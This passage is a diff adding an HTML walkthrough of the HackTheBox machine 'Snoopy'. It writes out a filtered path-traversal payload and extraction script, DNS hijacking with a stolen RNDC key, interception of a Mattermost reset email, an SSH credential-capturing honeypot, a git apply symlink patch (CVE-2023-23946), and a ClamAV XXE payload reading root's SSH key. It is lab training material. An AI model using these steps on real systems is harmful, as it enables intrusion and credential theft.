+                    <p>For the final escalation to root, I leveraged sbrown's sudo permissions to execute <code>clamscan</code> with the <code>--debug</code> flag. The installed version of ClamAV (1.0.0) was vulnerable to CVE-2023-20052, an XXE (XML External Entity) vulnerability when parsing DMG files. I modified a legitimate DMG file by injecting an XXE entity that read the <code>/root/.ssh/id_rsa</code> file, allowing me to extract root's SSH private key and obtain full system access.</p>
+                    
+                    <p><strong>Technologies/Exploits:</strong> Filtered path traversal with scripting, Bind DNS RNDC key abuse, DNS zone hijacking, SMTP server hijacking with aiosmtpd, Mattermost password reset bypass, SSH honeypot for credential harvesting, Git apply path traversal (CVE-2023-23946), ClamAV XXE arbitrary file read (CVE-2023-20052).</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>I start with an nmap scan to identify open ports and running services:</p>
+                <p><img src="./media/image11.png" alt="Nmap scan showing open ports including DNS on 53, HTTP on 80 and other services" /></p>
+
+                <p>The scan reveals several interesting services. What catches my attention most is that port 53 (DNS) is open, which is unusual for a typical HackTheBox machine. Additionally, on the website's contact page I find this significant message:</p>
+
+                <blockquote>
+                    <p>"Attention: As we migrate DNS records to our new domain please be advised that our mailserver 'mail.snoopy.htb' is currently offline."</p>
+                </blockquote>
+
+                <p>This message suggests they're in the middle of a DNS migration and that the mail server is temporarily out of service, which could be relevant later.</p>
+
+                <h2>Initial Web Enumeration</h2>
+                <p>When trying to use the contact form on the website, I see this error message:</p>
+                <p><img src="./media/image10.png" alt="Error message on contact form indicating problems with mail service" /></p>
+
+                <p>I add the domains <code>snoopy.htb</code> and <code>mail.snoopy.htb</code> to the <code>/etc/hosts</code> file. During web enumeration, I identify several potential system users:</p>
+                <p><img src="./media/image3.png" alt="List of users found on the website" /></p>
+
+                <p>I run gobuster to enumerate directories and find an interesting path: <code>/download</code></p>
+                <p><img src="./media/image9.png" alt="Gobuster results showing the /download directory" /></p>
+
+                <p>When accessing this path, it downloads a ZIP file containing a PDF and MP4, though these files don't provide immediately useful information.</p>
+
+                <h2>Virtual Host Discovery</h2>
+                <p>I run a virtual host scan with gobuster and discover an additional one:</p>
+                <p><img src="./media/image6.png" alt="Virtual host mm.snoopy.htb discovered with gobuster" /></p>
+
+                <p>I add <code>mm.snoopy.htb</code> to <code>/etc/hosts</code> and upon accessing it, discover it's a Mattermost instance. For those unfamiliar, Mattermost is an open-source, self-hosted team communication platform similar to Slack.</p>
+
+                <p>The page presents a login form for which I don't have credentials, but it also offers password reset functionality via email. When attempting to reset a password, I receive this message:</p>
+                <p><img src="./media/image13.png" alt="Message indicating a password reset email has been sent" /></p>
+
+                <p>The message confirms an email was sent, but I likely won't receive it due to the DNS migration mentioned earlier. This gives me an idea for later.</p>
+
+                <h2>DNS Enumeration - Zone Transfer</h2>
+                <p>Since port 53 is open, I attempt a DNS Zone Transfer to obtain information about DNS records:</p>
+
+                <pre><code class="language-bash">dig @10.10.11.212 snoopy.htb AXFR</code></pre>
+
+                <p>The command succeeds and reveals several interesting records:</p>
+
+                <pre><code class="language-plaintext">snoopy.htb.            86400   IN      SOA     ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400
+snoopy.htb.            86400   IN      NS      ns1.snoopy.htb.
+snoopy.htb.            86400   IN      NS      ns2.snoopy.htb.
+mattermost.snoopy.htb. 86400   IN      A       172.18.0.3
+mm.snoopy.htb.         86400   IN      A       127.0.0.1
+ns1.snoopy.htb.        86400   IN      A       10.0.50.10
+ns2.snoopy.htb.        86400   IN      A       10.0.51.10
+postgres.snoopy.htb.   86400   IN      A       172.18.0.2
+provisions.snoopy.htb. 86400   IN      A       172.18.0.4
+www.snoopy.htb.        86400   IN      A       127.0.0.1</code></pre>
+
+                <p>The IP addresses in the <code>172.18.0.x</code> range suggest dockerized services. The <code>provisions</code> and <code>postgres</code> subdomains are particularly interesting as they're new to me.</p>
+
+                <h2>Path Traversal - Analysis and Exploitation</h2>
+                <p>Returning to web enumeration, I examine the download path more closely. I find it's accessed through a file parameter in the URL:</p>
+
+                <pre><code class="language-plaintext">http://snoopy.htb/download?file=announcement.pdf</code></pre>
+
+                <p>This makes me suspect a possible path traversal vulnerability. I try a standard payload:</p>
+
+                <pre><code class="language-bash">curl http://snoopy.htb/download?file=../../../../../../../../../../../../../../../../../../etc/passwd</code></pre>
+
+                <p>However, this returns empty output, suggesting there's some type of filtering or sanitization in place.</p>
+
+                <h3>Fuzzing to Identify the Filter</h3>
+                <p>To confirm if path traversal exists and understand how it's filtered, I run fuzzing with ffuf:</p>
+
+                <pre><code class="language-bash">ffuf -u http://snoopy.htb/download?file=FUZZ -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mc all -ac</code></pre>
+
+                <p>The fuzzing confirms path traversal exists, but with different syntax. It appears the filter removes simple <code>../</code> sequences, but doesn't properly handle the <code>....//</code> sequence. When processed, <code>....//</code> effectively becomes <code>../</code> after sanitization.</p>
+
+                <p>I test with the modified syntax:</p>
+
+                <pre><code class="language-bash">curl -o- http://snoopy.htb/download?file=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd</code></pre>
+
+                <p>This returns data, but there's a problem: the content comes in compressed ZIP format instead of plain text. To facilitate exploitation, I create a Python script that automates the download, decompression, and extraction process:</p>
+
+                <pre><code class="language-python">#!/usr/bin/env python3
+
+import requests
+import sys
+import zipfile
+from io import BytesIO
+
+if len(sys.argv) < 2:
+    print(f"usage: {sys.argv[0]} [full path of file]")
+    sys.exit()
+
+fpath = sys.argv[1]
+outfile = sys.argv[2] if len(sys.argv) > 2 else None
+
+resp = requests.get(f'http://snoopy.htb/download?file=....//....//....//....//....//{fpath}')
+
+if len(resp.content) == 0:
+    print(f"File not found: {fpath}")
+    sys.exit()
+
+with zipfile.ZipFile(BytesIO(resp.content)) as zip_file:
+    file_path_in_zip = zip_file.namelist()[0]
+    with zip_file.open(file_path_in_zip) as file:
+        contents = file.read()
+        if outfile:
+            with open(outfile, 'wb') as f:
+                f.write(contents)
+            print(f"Results written to {outfile}")
+        else:
+            print(contents.decode())</code></pre>
+
+                <p>Now I can easily extract files. For example, to get system users:</p>
+
+                <pre><code class="language-bash">python3 openzip.py /etc/passwd | grep bash</code></pre>
+
+                <pre><code class="language-plaintext">root:x:0:0:root:/root:/bin/bash
+cbrown:x:1000:1000:Charlie Brown:/home/cbrown:/bin/bash
+sbrown:x:1001:1001:Sally Brown:/home/sbrown:/bin/bash
+lpelt:x:1003:1004::/home/lpelt:/bin/bash
+cschultz:x:1004:1005:Charles Schultz:/home/cschultz:/bin/bash
+vgray:x:1005:1006:Violet Gray:/home/vgray:/bin/bash</code></pre>
+
+                <p>These users correspond to the names I saw earlier on the website.</p>
+
+                <h2>Extracting the RNDC Key</h2>
+                <p>Bind is the most popular DNS service on Linux systems. I use the path traversal to extract the Bind configuration file:</p>
+
+                <pre><code class="language-bash">python3 openzip.py /etc/bind/named.conf</code></pre>
+
+                <p>In the configuration I find a critical RNDC (Remote Name Daemon Control) key:</p>
+
+                <pre><code class="language-plaintext">key "rndc-key" {
+    algorithm hmac-sha256;
+    secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";
+};</code></pre>
+
+                <p>This key allows making dynamic modifications to the DNS service, which is exactly what I need for my next step.</p>
+
+                <h2>DNS Hijacking - Redirecting the Mail Server</h2>
+                <p>My strategy is as follows: knowing there are applications trying to send emails to <code>mail.snoopy.htb</code> and that this service is currently offline due to migration, I can modify the DNS record for <code>mail.snoopy.htb</code> to point to my machine. This way I can intercept the emails.</p>
+
+                <p>According to Bind documentation (<a href="https://bind9.readthedocs.io/en/v9_16_22/advanced.html#tsig">TSIG</a>), I can use the <code>nsupdate</code> tool to dynamically update DNS records.</p>
+
+                <h3>Preparing the DNS Update</h3>
+                <p>First, I save the RNDC key to a file called <code>rndc.key</code>:</p>
+
+                <pre><code class="language-plaintext">key "rndc-key" {
+    algorithm hmac-sha256;
+    secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";
+};</code></pre>
+
+                <p>Then I create a file <code>mail_dns.txt</code> with the DNS update commands:</p>
+
+                <pre><code class="language-plaintext">server 10.10.11.212
+zone snoopy.htb
+update add mail.snoopy.htb 86400 IN A 10.10.16.2
+send</code></pre>
+
+                <p>These commands specify the target DNS server, the zone to modify, the new A record for <code>mail.snoopy.htb</code> pointing to my IP address, and finally send the update.</p>
+
+                <p>I execute the update:</p>
+
+                <pre><code class="language-bash">nsupdate -k rndc.key mail_dns.txt</code></pre>
+
+                <p>I verify the change has been applied correctly:</p>
+
+                <pre><code class="language-bash">dig mail.snoopy.htb +noall +answer @10.10.11.212</code></pre>
+
+                <pre><code class="language-plaintext">mail.snoopy.htb.    86400   IN      A       10.10.16.2</code></pre>
+
+                <p>Perfect! Now <code>mail.snoopy.htb</code> resolves to my attacking machine.</p>
+
+                <h2>Setting Up the Fake SMTP Server</h2>
+                <p>Now I need to set up an SMTP server on my machine to receive emails. I'll use Python's <code>aiosmtpd</code> module, which provides a simple SMTP server similar to how <code>http.server</code> provides an HTTP server.</p>
+
+                <p>First, I grant Python the capability to listen on privileged ports (below 1024):</p>
+
+                <pre><code class="language-bash">sudo setcap cap_net_bind_service=ep /usr/bin/python3.13</code></pre>
+
+                <p>I create a virtual environment and install the necessary module:</p>
+
+                <pre><code class="language-bash">python3 -m venv venv
+source venv/bin/activate
+pip3 install aiosmtpd</code></pre>
+
+                <p>Finally, I start the SMTP server on port 25:</p>
+
+                <pre><code class="language-bash">python -m aiosmtpd -n -l 0.0.0.0:25</code></pre>
+
+                <h2>Mattermost Access - Password Reset</h2>
+                <p>With my fake SMTP server running and DNS pointing to my machine, I go to the Mattermost page and request a password reset for user <code>cbrown@snoopy.htb</code>:</p>
+                <p><img src="./media/image5.png" alt="Mattermost password reset form for cbrown@snoopy.htb" /></p>
+
+                <p>My SMTP server receives the email with a password reset URL:</p>
+
+                <pre><code class="language-plaintext">http://mm.snoopy.htb/reset_password_complete?token=3Dob8pf=
+mfin8hu18hdxjrfdq96nj6g137srigycdzhort4ziurndmree9dig6re6ia</code></pre>
+
+                <p>However, when trying to use this token directly, I encounter a problem:</p>
+                <p><img src="./media/image7.png" alt="Error when trying to use the unencoded password reset token" /></p>
+
+                <h3>Decoding the Token - Quoted-Printable Encoding</h3>
+                <p>The problem is that the email is received in plain text with Quoted-Printable encoding, which is an email encoding standard. In this encoding:</p>
+                <ul>
+                    <li><code>=3D</code> represents the <code>=</code> character</li>
+                    <li>An <code>=</code> at the end of a line simply indicates a soft line break that should be ignored</li>
+                </ul>
+
+                <p>I manually decode the token:
+                <ul>
+                    <li>Remove the <code>=3D</code> at the beginning (which is an <code>=</code>)</li>
+                    <li>Remove the <code>=</code> after <code>...8pf</code> (which is just a line break)</li>
+                </ul>
+                </p>
+
+                <p>The corrected token is:</p>
+
+                <pre><code class="language-plaintext">ob8pfmfin8hu18hdxjrfdq96nj6g137srigycdzhort4ziurndmree9dig6re6ia</code></pre>
+
+                <p>Now I can access the password reset page and set a new password for user cbrown:</p>
+                <p><img src="./media/image1.png" alt="Password change form working correctly with the decoded token" /></p>
+
+                <p>Perfect! I now have access to Mattermost as cbrown.</p>
+
+                <h2>Exploring Mattermost</h2>
+                <p>Once inside, I identify the versions of the running software:</p>
+
+                <pre><code class="language-plaintext">Mattermost Version: 7.9.0
+Database Schema Version: 104
+Database: postgres</code></pre>
+
+                <p>In the chat channels, I see conversations about a Linux antivirus (ClamAV) and references to a provisioning channel. I find a channel called "provisioning" that has custom slash commands available.</p>
+
+                <p>When exploring slash commands using <code>/</code>, I discover one called "server provisioning" that presents this modal form:</p>
+                <p><img src="./media/image14.png" alt="Server provisioning modal requesting hostname, SSH port and key" /></p>
+
+                <h2>SSH Honeypot - Capturing Credentials</h2>
+                <p>The form requests a hostname, SSH port, and a key. I first test by setting up a basic netcat listener on port 2222:</p>
+
+                <pre><code class="language-bash">sudo nc -lvnp 2222</code></pre>
+
+                <p>After submitting the form, I receive an SSH connection:</p>
+
+                <pre><code class="language-plaintext">listening on [any] 2222 ...
+connect to [10.10.16.2] from (UNKNOWN) [10.10.11.212] 56464
+SSH-2.0-paramiko_3.1.0</code></pre>
+
+                <p><img src="./media/image8.png" alt="Incoming SSH connection showing paramiko version" /></p>
+
+                <p>This confirms the system is attempting to SSH to my machine, probably with stored credentials. To capture these credentials, I need a real SSH honeypot server that can log authentication attempts.</p>
+
+                <h3>Implementing the Honeypot</h3>
+                <p>I create a Python script that implements a basic SSH honeypot using the Paramiko library. The script accepts SSH connections but rejects authentications after logging the provided credentials.</p>
+
+                <p>I run the honeypot:</p>
+
+                <pre><code class="language-bash">python3 sshhoneypot.py</code></pre>
+
+                <pre><code class="language-plaintext">2025-12-14 14:40:33,648 - SSH Honeypot started on 0.0.0.0:2222
+2025-12-14 14:40:33,648 - Waiting for connections...
+2025-12-14 14:40:57,794 - Connection from 10.10.11.212:40680
+2025-12-14 14:40:57,795 - Generating new RSA host key...
+2025-12-14 14:40:57,865 - Connected (version 2.0, client paramiko_3.1.0)
+2025-12-14 14:40:58,611 - Login attempt from 10.10.11.212 - Username: cbrown, Password: sn00pedcr3dential!!!
+2025-12-14 14:40:58,611 - Auth rejected (password).</code></pre>
+
+                <p>Excellent! I've captured valid credentials:</p>
+
+                <pre><code class="language-plaintext">cbrown:sn00pedcr3dential!!!</code></pre>
+
+                <h2>Initial SSH Access</h2>
+                <p>With these credentials, I connect to the system via SSH:</p>
+
+                <pre><code class="language-bash">ssh cbrown@10.10.11.212</code></pre>
+
+                <p>Access granted! I'm inside the system as user cbrown.</p>
+
+                <h2>Enumeration as cbrown</h2>
+                <p>After gaining access, the first thing I do is check available sudo privileges:</p>
+
+                <pre><code class="language-bash">sudo -l</code></pre>
+
+                <pre><code class="language-plaintext">Matching Defaults entries for cbrown on snoopy:
+    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass
+
+User cbrown may run the following commands on snoopy:
+    (sbrown) PASSWD: /usr/bin/git ^apply -v [a-zA-Z0-9.]+$</code></pre>
+
+                <p>This indicates I can execute <code>git apply -v</code> as user sbrown, but with a regular expression that restricts the filename to alphanumeric characters and dots.</p>
+
+                <p>In the system's <code>/home</code> directory I find two users: <code>cbrown</code> and <code>sbrown</code>. I search for Git repositories on the system but initially find none:</p>
+
+                <pre><code class="language-bash">find / -type d -name .git 2>/dev/null</code></pre>
+
+                <h2>CVE-2023-23946 - Git Apply Path Traversal</h2>
+                <p>I check the installed Git version:</p>
+
+                <pre><code class="language-bash">git --version</code></pre>
+
+                <pre><code class="language-plaintext">git version 2.34.1</code></pre>
+
+                <p>This version is vulnerable to CVE-2023-23946, a path traversal in <code>git apply</code> that allows writing files outside the current repository working directory. The exploit abuses how Git handles symbolic links when they're renamed in patch files.</p>
+
+                <p>I find a useful proof of concept at: <a href="https://github.com/bruno-1337/CVE-2023-23946-POC">https://github.com/bruno-1337/CVE-2023-23946-POC</a></p>
+
+                <h3>Understanding the Vulnerability</h3>
+                <p>The vulnerability works as follows:</p>
+                <ol>
+                    <li>I create a symbolic link pointing to the target user's (sbrown) <code>.ssh</code> directory</li>
+                    <li>I commit the symbolic link to a Git repository</li>
+                    <li>I create a patch file that first renames the symbolic link and then creates a new file inside that "renamed" symbolic link</li>
+                    <li>When Git processes the patch, due to a flaw in path traversal handling, it ends up writing the file to the real location the symbolic link points to, not in the working directory</li>
+                </ol>
+
+                <h3>Step-by-Step Exploitation</h3>
+                <p>I create a temporary working directory and begin exploitation:</p>
+
+                <pre><code class="language-bash">cd /tmp
+mkdir exploit
+cd exploit</code></pre>
+
+                <p><strong>Step 1:</strong> Create a symbolic link to sbrown's .ssh directory:</p>
+
+                <pre><code class="language-bash">ln -s /home/sbrown/.ssh symlink</code></pre>
+
+                <p><strong>Step 2:</strong> Initialize a Git repository:</p>
+
+                <pre><code class="language-bash">git init</code></pre>
+
+                <p><strong>Step 3:</strong> Add and commit the symbolic link:</p>
+
+                <pre><code class="language-bash">git add symlink
+git commit -m "commit"</code></pre>
+
+                <p><strong>Step 4:</strong> Create the malicious patch file called <code>xploit.patch</code>:</p>
+
+                <pre><code class="language-diff">diff --git a/symlink b/rn-symlink
+rename from symlink
+rename to rn-symlink
+--
+diff --git /dev/null b/rn-symlink/authorized_keys
+new file mode 100644
+index 0000000..e47f4ea
+--- /dev/null
++++ b/rn-symlink/authorized_keys
+@@ -0,0 +1,1 @@
++ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINaRz0/4BTr6JaFNeVYUvYqjewZLVyGvYKaj+2Z08nJw xd@xd.com</code></pre>
+
+                <p>This patch does two things:</p>
+                <ul>
+                    <li>First, it renames the symbolic link from <code>symlink</code> to <code>rn-symlink</code></li>
+                    <li>Second, it creates a new <code>authorized_keys</code> file inside <code>rn-symlink/</code> with my SSH public key</li>
+                </ul>
+
+                <p>The public key I include is from an SSH key pair I previously generated on my local machine:</p>
+
+                <pre><code class="language-bash">ssh-keygen -t ed25519 -f id_ed25519</code></pre>
+
+                <p><strong>Step 5:</strong> Execute the exploit using sudo to apply the patch as sbrown:</p>
+
+                <pre><code class="language-bash">sudo -u sbrown git apply -v xploit.patch</code></pre>
+
+                <p>Due to path traversal, Git ends up writing the <code>authorized_keys</code> file to <code>/home/sbrown/.ssh/authorized_keys</code> instead of the current working directory.</p>
+
+                <p><strong>Step 6:</strong> Connect as sbrown using my private key:</p>
+
+                <pre><code class="language-bash">ssh -i id_ed25519 sbrown@snoopy.htb</code></pre>
+
+                <p>Success! I now have access as user sbrown and can retrieve the user flag.</p>
+
+                <h2>Privilege Escalation to Root</h2>
+                <p>As sbrown, I check sudo permissions again:</p>
+
+                <pre><code class="language-bash">sudo -l</code></pre>
+
+                <pre><code class="language-plaintext">Matching Defaults entries for sbrown on snoopy:
+    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass
+
+User sbrown may run the following commands on snoopy:
+    (root) NOPASSWD: /usr/local/bin/clamscan ^--debug /home/sbrown/scanfiles/[a-zA-Z0-9.]+$</code></pre>
+
+                <p>I can execute <code>clamscan</code> with the <code>--debug</code> flag as root, but only on files within the <code>/home/sbrown/scanfiles/</code> directory with names matching the specified pattern.</p>
+
+                <p>I check the installed ClamAV version:</p>
+
+                <pre><code class="language-bash">clamscan --version</code></pre>
+
+                <pre><code class="language-plaintext">ClamAV 1.0.0/26853/Fri Mar 24 07:24:11 2023</code></pre>
+
+                <h2>CVE-2023-20052 - ClamAV XXE Arbitrary File Read</h2>
+                <p>This ClamAV version is vulnerable to several CVEs. The ones that interest me are:</p>
+                <ul>
+                    <li><a href="https://security-tracker.debian.org/tracker/CVE-2023-20032">CVE-2023-20032</a> - Remote code execution</li>
+                    <li><a href="https://security-tracker.debian.org/tracker/CVE-2023-20052">CVE-2023-20052</a> - Arbitrary file read via XXE</li>
+                </ul>
+
+                <p>The first is RCE but I don't find a viable PoC and it seems difficult to exploit. For the second, I find this exploit: <a href="https://github.com/nokn0wthing/CVE-2023-20052">https://github.com/nokn0wthing/CVE-2023-20052</a></p>
+
+                <h3>Understanding CVE-2023-20052</h3>
+                <p>This vulnerability exploits an XXE (XML External Entity) in ClamAV's XML parser when processing DMG (Apple Disk Image) files with the <code>--debug</code> flag enabled. DMG files contain internal XML describing the disk structure, and ClamAV parses this XML without properly disabling external entities.</p>
+
+                <p>The strategy is:</p>
+                <ol>
+                    <li>Get a legitimate DMG file</li>
+                    <li>Modify the internal XML of the DMG to inject an XXE entity that reads a system file</li>
+                    <li>Have ClamAV scan the file with <code>--debug</code></li>
+                    <li>The debug output will reveal the contents of the read file</li>
+                </ol>
+
+                <h3>Preparing the Exploit</h3>
+                <p>I download a legitimate DMG file from: <a href="https://macdownload.informer.com/notepad/download/#downloading">https://macdownload.informer.com/notepad/download/#downloading</a></p>
+
+                <p>I use the <code>ghex</code> tool (a hexadecimal editor) to modify the XML content inside <code>notepad.dmg</code>. I search for the XML section and modify it to include my XXE payload:</p>
+
+                <p><img src="./media/image4.png" alt="Hexadecimal editor showing XXE entity injection in the DMG file" /></p>
+
+                <p><img src="./media/image2.png" alt="Continuation of hexadecimal editor showing reference to XXE entity" /></p>
+
+                <p>The XXE payload I inject has this structure:</p>
+
+                <pre><code class="language-xml">&lt;!DOCTYPE plist [
+  &lt;!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa"&gt;
+]&gt;
+&lt;plist&gt;
+  &lt;key&gt;&amp;xxe;&lt;/key&gt;
+&lt;/plist&gt;</code></pre>
+
+                <p>This defines an XXE entity called <code>xxe</code> that reads the contents of the <code>/root/.ssh/id_rsa</code> file, and then references it inside a <code>&lt;key&gt;</code> element so it expands when ClamAV parses the XML.</p>
+
+                <h3>Executing the Exploit</h3>
+                <p>I transfer the modified DMG file to the victim machine in the <code>/home/sbrown/scanfiles/</code> directory. Then I execute the scan with root privileges:</p>
+
+                <pre><code class="language-bash">sudo clamscan --debug /home/sbrown/scanfiles/notepad.dmg</code></pre>
+
+                <p>The debug output is extensive, but among all the debugging information, I find root's SSH private key:</p>
+
+                <p><img src="./media/image12.png" alt="Clamscan command output showing root's SSH private key extracted via XXE" /></p>
+
+                <p>I copy the private key to my local machine, save it in a file called <code>id_rsa</code>, and set the correct permissions:</p>
+
+                <pre><code class="language-bash">chmod 600 id_rsa</code></pre>
+
+                <p>Finally, I connect as root using the extracted private key:</p>
+
+                <pre><code class="language-bash">ssh -i id_rsa root@snoopy.htb</code></pre>
+
+                <pre><code class="language-plaintext">Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-71-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+root@snoopy:~#</code></pre>
+
+                <p>Perfect! I have full root access and can retrieve the root flag, thus completing the machine.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
